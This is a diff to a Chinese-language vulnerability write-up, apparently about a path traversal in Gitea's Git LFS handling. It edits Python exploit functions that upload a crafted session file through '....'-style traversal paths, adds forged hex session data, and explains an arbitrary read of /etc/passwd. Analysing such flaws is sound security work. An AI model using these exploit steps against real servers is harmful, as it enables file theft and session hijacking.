@@ -126,7 +126,7 @@ func transformKey(key string) string {
 
 可以看到`transformKey()`方法是把key参数做了三次分割，先取两个字符，加上`/`，然后再取两个，再加上`/`，最后拼接后面部分，举例说明：
 
-`abcdefgh -> ab\cd\efgh`
+`abcdefgh -> ab/cd/efgh`
 
 于是此处就可以构造`..../etc/passwd`的格式，经过`transformKey()`后被转换成`../../etc/passwd`，这样就存在一个任意文件读取漏洞。
 
@@ -466,7 +466,7 @@ def create_lfs_object(session):
     }
 
     url = '%s.git/info/lfs/objects' % (GIT_URL)
-    response = s.post(
+    response = session.post(
         url,
         json=data,
         headers={
@@ -491,7 +491,7 @@ def write_session(session):
     oid = '....gitea/sessions/1/1/11session'
     url = '%s.git/info/lfs/objects/%s' % (GIT_URL, urllib.quote(oid, safe=''))
     print url
-    response = s.put(url, data=gen_data(), headers={
+    response = session.put(url, data=gen_data(), headers={
         'Accept': 'application/vnd.git-lfs',
         'Content-Type': 'application/vnd.git-lfs',
         'Authorization': 'Bearer ' + AUTH_TOKEN
@@ -507,7 +507,14 @@ def gen_data():
     time.sleep(300)
 ```
 
-##### 6. 修改cookie
+`HEX_DATA`是生成的`session`数据
+
+```python
+HEX_DATA = '0eff81040102ff8...d696e313233'	//hex_data
+SESSION_DATA = HEX_DATA.decode('hex')
+```
+
+##### 6. 修改Session
 
 ![1531905605099](https://ob5vt1k7f.qnssl.com/1531905605099.png)
 
